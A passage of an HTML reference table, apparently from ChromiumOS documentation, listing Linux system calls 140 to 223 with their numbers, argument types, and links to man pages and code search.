align="center">140</td><td>setpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpriority">cs/</a></td><td align="center">0x8c</td><td>int which</td><td>int who</td><td>int niceval</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">141</td><td>getpriority</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpriority.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpriority">cs/</a></td><td align="center">0x8d</td><td>int which</td><td>int who</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">142</td><td>reboot</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/reboot.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*reboot">cs/</a></td><td align="center">0x8e</td><td>int magic1</td><td>int magic2</td><td>unsigned int cmd</td><td>void *arg</td><td>-</td><td>-</td></tr><tr><td align="center">143</td><td>setregid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setregid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setregid">cs/</a></td><td align="center">0x8f</td><td>gid_t rgid</td><td>gid_t egid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">144</td><td>setgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgid">cs/</a></td><td align="center">0x90</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">145</td><td>setreuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setreuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setreuid">cs/</a></td><td align="center">0x91</td><td>uid_t ruid</td><td>uid_t euid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">146</td><td>setuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setuid">cs/</a></td><td align="center">0x92</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">147</td><td>setresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresuid">cs/</a></td><td align="center">0x93</td><td>uid_t ruid</td><td>uid_t euid</td><td>uid_t suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">148</td><td>getresuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresuid">cs/</a></td><td align="center">0x94</td><td>uid_t *ruid</td><td>uid_t *euid</td><td>uid_t *suid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">149</td><td>setresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setresgid">cs/</a></td><td align="center">0x95</td><td>gid_t rgid</td><td>gid_t egid</td><td>gid_t sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">150</td><td>getresgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getresgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getresgid">cs/</a></td><td align="center">0x96</td><td>gid_t *rgid</td><td>gid_t *egid</td><td>gid_t *sgid</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">151</td><td>setfsuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsuid">cs/</a></td><td align="center">0x97</td><td>uid_t uid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">152</td><td>setfsgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setfsgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setfsgid">cs/</a></td><td align="center">0x98</td><td>gid_t gid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">153</td><td>times</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/times.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*times">cs/</a></td><td align="center">0x99</td><td>struct tms *tbuf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">154</td><td>setpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setpgid">cs/</a></td><td align="center">0x9a</td><td>pid_t pid</td><td>pid_t pgid</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">155</td><td>getpgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpgid">cs/</a></td><td align="center">0x9b</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">156</td><td>getsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsid">cs/</a></td><td align="center">0x9c</td><td>pid_t pid</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">157</td><td>setsid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsid">cs/</a></td><td align="center">0x9d</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">158</td><td>getgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgroups">cs/</a></td><td align="center">0x9e</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">159</td><td>setgroups</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setgroups.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setgroups">cs/</a></td><td align="center">0x9f</td><td>int gidsetsize</td><td>gid_t *grouplist</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">160</td><td>uname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/uname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*uname">cs/</a></td><td align="center">0xa0</td><td>struct old_utsname *</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">161</td><td>sethostname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sethostname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sethostname">cs/</a></td><td align="center">0xa1</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">162</td><td>setdomainname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setdomainname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setdomainname">cs/</a></td><td align="center">0xa2</td><td>char *name</td><td>int len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">163</td><td>getrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrlimit">cs/</a></td><td align="center">0xa3</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">164</td><td>setrlimit</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setrlimit.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setrlimit">cs/</a></td><td align="center">0xa4</td><td>unsigned int resource</td><td>struct rlimit *rlim</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">165</td><td>getrusage</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getrusage.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getrusage">cs/</a></td><td align="center">0xa5</td><td>int who</td><td>struct rusage *ru</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">166</td><td>umask</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/umask.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*umask">cs/</a></td><td align="center">0xa6</td><td>int mask</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">167</td><td>prctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/prctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*prctl">cs/</a></td><td align="center">0xa7</td><td>int option</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">168</td><td>getcpu</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getcpu.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getcpu">cs/</a></td><td align="center">0xa8</td><td>unsigned *cpu</td><td>unsigned *node</td><td>struct getcpu_cache *cache</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">169</td><td>gettimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettimeofday">cs/</a></td><td align="center">0xa9</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">170</td><td>settimeofday</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/settimeofday.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*settimeofday">cs/</a></td><td align="center">0xaa</td><td>struct timeval *tv</td><td>struct timezone *tz</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">171</td><td>adjtimex</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/adjtimex.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*adjtimex">cs/</a></td><td align="center">0xab</td><td>struct __kernel_timex *txc_p</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">172</td><td>getpid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpid">cs/</a></td><td align="center">0xac</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">173</td><td>getppid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getppid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getppid">cs/</a></td><td align="center">0xad</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">174</td><td>getuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getuid">cs/</a></td><td align="center">0xae</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">175</td><td>geteuid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/geteuid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*geteuid">cs/</a></td><td align="center">0xaf</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">176</td><td>getgid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getgid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getgid">cs/</a></td><td align="center">0xb0</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">177</td><td>getegid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getegid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getegid">cs/</a></td><td align="center">0xb1</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">178</td><td>gettid</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/gettid.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*gettid">cs/</a></td><td align="center">0xb2</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">179</td><td>sysinfo</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sysinfo.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sysinfo">cs/</a></td><td align="center">0xb3</td><td>struct sysinfo *info</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">180</td><td>mq_open</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_open.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_open">cs/</a></td><td align="center">0xb4</td><td>const char *name</td><td>int oflag</td><td>umode_t mode</td><td>struct mq_attr *attr</td><td>-</td><td>-</td></tr><tr><td align="center">181</td><td>mq_unlink</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_unlink.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_unlink">cs/</a></td><td align="center">0xb5</td><td>const char *name</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">182</td><td>mq_timedsend</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedsend.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedsend">cs/</a></td><td align="center">0xb6</td><td>mqd_t mqdes</td><td>const char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">183</td><td>mq_timedreceive</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_timedreceive.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_timedreceive">cs/</a></td><td align="center">0xb7</td><td>mqd_t mqdes</td><td>char *msg_ptr</td><td>size_t msg_len</td><td>unsigned int *msg_prio</td><td>const struct __kernel_timespec *abs_timeout</td><td>-</td></tr><tr><td align="center">184</td><td>mq_notify</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_notify.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_notify">cs/</a></td><td align="center">0xb8</td><td>mqd_t mqdes</td><td>const struct sigevent *notification</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">185</td><td>mq_getsetattr</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mq_getsetattr.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mq_getsetattr">cs/</a></td><td align="center">0xb9</td><td>mqd_t mqdes</td><td>const struct mq_attr *mqstat</td><td>struct mq_attr *omqstat</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">186</td><td>msgget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgget">cs/</a></td><td align="center">0xba</td><td>key_t key</td><td>int msgflg</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">187</td><td>msgctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgctl">cs/</a></td><td align="center">0xbb</td><td>int msqid</td><td>int cmd</td><td>struct msqid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">188</td><td>msgrcv</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgrcv.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgrcv">cs/</a></td><td align="center">0xbc</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>long msgtyp</td><td>int msgflg</td><td>-</td></tr><tr><td align="center">189</td><td>msgsnd</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/msgsnd.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*msgsnd">cs/</a></td><td align="center">0xbd</td><td>int msqid</td><td>struct msgbuf *msgp</td><td>size_t msgsz</td><td>int msgflg</td><td>-</td><td>-</td></tr><tr><td align="center">190</td><td>semget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semget">cs/</a></td><td align="center">0xbe</td><td>key_t key</td><td>int nsems</td><td>int semflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">191</td><td>semctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semctl">cs/</a></td><td align="center">0xbf</td><td>int semid</td><td>int semnum</td><td>int cmd</td><td>unsigned long arg</td><td>-</td><td>-</td></tr><tr><td align="center">192</td><td>semtimedop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semtimedop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semtimedop">cs/</a></td><td align="center">0xc0</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>const struct __kernel_timespec *timeout</td><td>-</td><td>-</td></tr><tr><td align="center">193</td><td>semop</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/semop.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*semop">cs/</a></td><td align="center">0xc1</td><td>int semid</td><td>struct sembuf *sops</td><td>unsigned nsops</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">194</td><td>shmget</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmget.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmget">cs/</a></td><td align="center">0xc2</td><td>key_t key</td><td>size_t size</td><td>int flag</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">195</td><td>shmctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmctl">cs/</a></td><td align="center">0xc3</td><td>int shmid</td><td>int cmd</td><td>struct shmid_ds *buf</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">196</td><td>shmat</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmat.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmat">cs/</a></td><td align="center">0xc4</td><td>int shmid</td><td>char *shmaddr</td><td>int shmflg</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">197</td><td>shmdt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shmdt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shmdt">cs/</a></td><td align="center">0xc5</td><td>char *shmaddr</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">198</td><td>socket</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socket.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socket">cs/</a></td><td align="center">0xc6</td><td>int</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">199</td><td>socketpair</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/socketpair.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*socketpair">cs/</a></td><td align="center">0xc7</td><td>int</td><td>int</td><td>int</td><td>int *</td><td>-</td><td>-</td></tr><tr><td align="center">200</td><td>bind</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/bind.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*bind">cs/</a></td><td align="center">0xc8</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">201</td><td>listen</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/listen.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*listen">cs/</a></td><td align="center">0xc9</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">202</td><td>accept</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/accept.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*accept">cs/</a></td><td align="center">0xca</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">203</td><td>connect</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/connect.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*connect">cs/</a></td><td align="center">0xcb</td><td>int</td><td>struct sockaddr *</td><td>int</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">204</td><td>getsockname</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockname.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockname">cs/</a></td><td align="center">0xcc</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">205</td><td>getpeername</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getpeername.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getpeername">cs/</a></td><td align="center">0xcd</td><td>int</td><td>struct sockaddr *</td><td>int *</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">206</td><td>sendto</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendto.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendto">cs/</a></td><td align="center">0xce</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int</td></tr><tr><td align="center">207</td><td>recvfrom</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvfrom.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvfrom">cs/</a></td><td align="center">0xcf</td><td>int</td><td>void *</td><td>size_t</td><td>unsigned</td><td>struct sockaddr *</td><td>int *</td></tr><tr><td align="center">208</td><td>setsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/setsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*setsockopt">cs/</a></td><td align="center">0xd0</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int optlen</td><td>-</td></tr><tr><td align="center">209</td><td>getsockopt</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/getsockopt.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*getsockopt">cs/</a></td><td align="center">0xd1</td><td>int fd</td><td>int level</td><td>int optname</td><td>char *optval</td><td>int *optlen</td><td>-</td></tr><tr><td align="center">210</td><td>shutdown</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/shutdown.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*shutdown">cs/</a></td><td align="center">0xd2</td><td>int</td><td>int</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">211</td><td>sendmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/sendmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*sendmsg">cs/</a></td><td align="center">0xd3</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">212</td><td>recvmsg</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/recvmsg.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*recvmsg">cs/</a></td><td align="center">0xd4</td><td>int fd</td><td>struct user_msghdr *msg</td><td>unsigned flags</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">213</td><td>readahead</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/readahead.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*readahead">cs/</a></td><td align="center">0xd5</td><td>int fd</td><td>loff_t offset</td><td>size_t count</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">214</td><td>brk</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/brk.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*brk">cs/</a></td><td align="center">0xd6</td><td>unsigned long brk</td><td>-</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">215</td><td>munmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/munmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*munmap">cs/</a></td><td align="center">0xd7</td><td>unsigned long addr</td><td>size_t len</td><td>-</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">216</td><td>mremap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mremap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mremap">cs/</a></td><td align="center">0xd8</td><td>unsigned long addr</td><td>unsigned long old_len</td><td>unsigned long new_len</td><td>unsigned long flags</td><td>unsigned long new_addr</td><td>-</td></tr><tr><td align="center">217</td><td>add_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/add_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*add_key">cs/</a></td><td align="center">0xd9</td><td>const char *_type</td><td>const char *_description</td><td>const void *_payload</td><td>size_t plen</td><td>key_serial_t destringid</td><td>-</td></tr><tr><td align="center">218</td><td>request_key</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/request_key.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*request_key">cs/</a></td><td align="center">0xda</td><td>const char *_type</td><td>const char *_description</td><td>const char *_callout_info</td><td>key_serial_t destringid</td><td>-</td><td>-</td></tr><tr><td align="center">219</td><td>keyctl</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/keyctl.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*keyctl">cs/</a></td><td align="center">0xdb</td><td>int cmd</td><td>unsigned long arg2</td><td>unsigned long arg3</td><td>unsigned long arg4</td><td>unsigned long arg5</td><td>-</td></tr><tr><td align="center">220</td><td>clone</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/clone.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*clone">cs/</a></td><td align="center">0xdc</td><td>unsigned long</td><td>unsigned long</td><td>int *</td><td>int *</td><td>unsigned long</td><td>-</td></tr><tr><td align="center">221</td><td>execve</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/execve.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*execve">cs/</a></td><td align="center">0xdd</td><td>const char *filename</td><td>const char *const *argv</td><td>const char *const *envp</td><td>-</td><td>-</td><td>-</td></tr><tr><td align="center">222</td><td>mmap</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/mmap.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*mmap">cs/</a></td><td align="center">0xde</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td><td>?</td></tr><tr><td align="center">223</td><td>fadvise64</td><td align="center"><a href="https://man7.org/linux/man-pages/man2/fadvise64.2.html">man/</a> <a href="https://source.chromium.org/search?ss=chromiumos&q=SYSCALL_DEFINE.*fadvise64">cs/</a></td><td align="center">0xdf</td><td>int fd</td><td>loff_t offset</td><td>size_t len</td><td>int advice</td><td>-</td><td>-</td></tr><tr><td align="center">224</td><td>swapon</td><td align="center"><a 